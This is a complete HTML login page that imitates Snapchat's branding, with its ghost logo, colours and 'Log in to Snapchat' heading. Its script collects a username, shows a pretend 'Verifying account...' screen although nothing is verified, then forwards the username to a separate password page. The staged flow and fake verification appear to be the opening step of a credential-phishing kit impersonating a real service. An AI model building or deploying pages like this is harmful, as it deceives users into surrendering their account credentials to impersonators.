<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Snapchat Login</title>
    <style>
      :root {
        --bg: #f7f7f7;
        --card: #ffffff;
        --border: #e5e5e5;
        --text: #111111;
        --muted: #5c636c;
        --blue: #0daff0;
        --blue-dark: #0a9ad6;
        --shadow: 0 8px 20px rgba(0, 0, 0, 0.04);
      }

      * { box-sizing: border-box; }

      html, body {
        margin: 0;
        padding: 0;
        min-height: 100%;
        background: var(--bg);
        color: var(--text);
        font-family: Arial, Helvetica, sans-serif;
      }

      body {
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 24px 16px;
      }

      .login-card {
        width: min(100%, 420px);
        min-height: 540px;
        background: var(--card);
        border: 1px solid var(--border);
        border-radius: 12px;
        box-shadow: var(--shadow);
        padding: 22px 26px 24px;
        display: flex;
        flex-direction: column;
        align-items: center;
      }

      .ghost {
        width: 72px;
        height: 79px;
        margin: 0 0 10px;
        flex: none;
      }

      h1 {
        margin: 0 0 22px;
        font-size: clamp(24px, 4vw, 32px);
        line-height: 1.15;
        font-weight: 600;
        letter-spacing: -1px;
        text-align: center;
      }

      .login-form {
        width: 100%;
      }

      label {
        display: block;
        margin: 0 0 6px;
        color: var(--muted);
        font-size: 16px;
        font-weight: 500;
      }

      input {
        width: 100%;
        height: 56px;
        border: 2px solid #111111;
        border-radius: 11px;
        background: #ffffff;
        color: var(--text);
        padding: 0 14px;
        font: inherit;
        font-size: 16px;
        outline: none;
      }

      input:focus {
        box-shadow: 0 0 0 3px rgba(13, 175, 240, 0.18);
      }

      .next-button {
        display: block;
        min-width: 100px;
        height: 48px;
        margin: 14px auto 0;
        padding: 0 24px;
        border: none;
        border-radius: 999px;
        background: var(--blue);
        color: #ffffff;
        font: inherit;
        font-size: 16px;
        font-weight: 700;
        cursor: pointer;
        transition: background 0.15s ease, transform 0.15s ease;
      }

      .next-button:hover {
        background: var(--blue-dark);
      }

      .next-button:active {
        transform: translateY(1px);
      }

      .next-button:focus-visible {
        outline: 3px solid #0a7cb5;
        outline-offset: 3px;
      }

      .separator {
        width: 100%;
        display: flex;
        align-items: center;
        gap: 16px;
        margin: 22px 0 18px;
        color: var(--muted);
        font-size: 16px;
      }

      .separator::before,
      .separator::after {
        content: "";
        height: 2px;
        flex: 1;
        background: #d9dce0;
      }

      .passkey-button {
        width: min(100%, 330px);
        min-height: 50px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        border: 1px solid #dedede;
        border-radius: 999px;
        background: #ffffff;
        color: #111111;
        font: inherit;
        font-size: 16px;
        cursor: pointer;
      }

      .key-icon {
        width: 18px;
        height: 18px;
        flex: none;
      }

      .loading-screen {
        position: fixed;
        inset: 0;
        background: rgba(255,255,255,0.82);
        display: none;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        z-index: 999;
      }

      .spinner {
        width: 48px;
        height: 48px;
        border: 5px solid #eaeaea;
        border-top-color: var(--blue);
        border-radius: 50%;
        animation: spin 0.9s linear infinite;
        margin-bottom: 16px;
      }

      @keyframes spin {
        to { transform: rotate(360deg); }
      }

      .loading-text {
        font-size: 18px;
        font-weight: 600;
        color: var(--text);
      }

      @media (max-width: 520px) {
        .login-card {
          min-height: 500px;
          padding: 18px 18px 20px;
        }

        .ghost {
          width: 62px;
          height: 68px;
        }

        input {
          height: 52px;
        }

        .separator {
          margin: 20px 0 16px;
        }
      }
    </style>
  </head>
  <body>
    <div class="loading-screen" id="loading-screen">
      <div class="spinner"></div>
      <div class="loading-text">Verifying account...</div>
    </div>

    <main class="login-card">
      <svg class="ghost" viewBox="0 0 100 110" role="img" aria-label="Ghost logo">
        <path
          d="M50 4c-15.6 0-25 11.4-25 27.1 0 4.7.8 9.2 1.7 13-2.8-2.6-6.2-5.2-9.3-4.1-3.1 1.1-4.4 4.2-2.9 7 1.7 3.2 7.3 5.2 9.2 9.1 1.2 2.4-1.6 5.8-4.1 9.1-3.9 5.1-9 10.1-16.2 13.3-3.6 1.6-2 5.7 1.1 7.3 5.4 2.8 11.4 2.2 16.8 5.6 3.1 1.9 4.8 6.1 9.2 6.1 4.6 0 8-2.7 13.3-2.7s8.7 2.7 13.3 2.7c4.4 0 6.1-4.2 9.2-6.1 5.4-3.4 11.4-2.8 16.8-5.6 3.1-1.6 4.7-5.7 1.1-7.3-7.2-3.2-12.3-8.2-16.2-13.3-2.5-3.3-5.3-6.7-4.1-9.1 1.9-3.9 7.5-5.9 9.2-9.1 1.5-2.8.2-5.9-2.9-7-3.1-1.1-6.5 1.5-9.3 4.1.9-3.8 1.7-8.3 1.7-13C75 15.4 65.6 4 50 4Z"
          fill="#ffffff"
          stroke="#050505"
          stroke-width="5"
          stroke-linejoin="round"
        />
      </svg>

      <h1>Log in to Snapchat</h1>

      <form class="login-form" id="login-form">
        <label for="username">Username</label>
        <input id="username" name="username" type="text" autocomplete="username" required autofocus>

        <button class="next-button" type="submit">Next</button>
      </form>

      <div class="separator" aria-hidden="true">OR</div>

      <button class="passkey-button" type="button">
        <svg class="key-icon" viewBox="0 0 24 24" aria-hidden="true">
          <path fill="currentColor" d="M14.5 3a6.5 6.5 0 0 0-6.2 8.5L2 17.8V22h4.2v-2.5h2.5V17h2.5l2.2-2.2A6.5 6.5 0 1 0 14.5 3Zm2.7 6.5a1.8 1.8 0 1 1 0-3.6 1.8 1.8 0 0 1 0 3.6Z"/>
        </svg>
        <span>Sign in with a passkey</span>
      </button>
    </main>

    <script>
      const form = document.getElementById("login-form");
      const loadingScreen = document.getElementById("loading-screen");

      form.addEventListener("submit", function (event) {
        event.preventDefault();

        const username = document.getElementById("username").value.trim();
        if (!username) return;

        loadingScreen.style.display = "flex";

        setTimeout(function () {
          window.location.href = "password.html?username=" + encodeURIComponent(username);
        }, 1200);
      });
    </script>
  </body>
</html>
